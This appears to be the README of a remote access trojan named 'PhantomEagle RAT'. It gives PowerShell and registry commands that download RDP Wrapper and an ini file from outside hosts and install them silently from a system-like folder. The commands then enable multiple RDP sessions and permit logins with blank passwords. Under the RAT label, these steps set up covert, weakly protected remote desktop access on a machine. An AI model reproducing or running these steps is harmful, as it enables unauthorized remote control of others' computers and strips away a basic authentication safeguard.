# PhantomEagle RAT
Evokes an unseen but powerful presence



# RDPWrap Setup and Configuration

Steps to install, configure, and customize RDP Wrapper for enabling multiple user sessions on Windows using the latest `.ini` file and registry settings.

## Installation Instructions

1. **Download the RDPWrap ZIP file:**

   Use the following PowerShell command to download the ZIP file from the official GitHub repository:

   ```powershell
   iwr -uri https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/rdpwrap-v1.6.2.zip -outfile rdpwrap.zip
   ```
2. **Expand the ZIP file:**

   ```
   Expand-Archive -Path rdpwrap.zip -DestinationPath .
   ```

3. **Run the installation script silently:**
   Use the following PowerShell command to install RDPWrap without opening a new window:
   
   ```powershell
   Start-Process -FilePath "C:\Windows\systemapps\install.bat" -ArgumentList "/S" -NoNewWindow -Wait
   ```

## Update the Latest INI File

To ensure RDPWrap works with the latest Windows updates, download the latest `rdpwrap.ini` file:
   ```powershell
   Invoke-WebRequest https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini -outfile "C:\Program Files\RDP Wrapper\rdpwrap.ini"
   ```

## Configuration Settings

### Set User Session Behavior

To allow multiple sessions per user, modify the Terminal Server registry settings:
   ```bash
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
   ```

### Allow Blank Passwords

To enable login with blank passwords, change the following registry key:
   ```bash
   reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
   ```

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
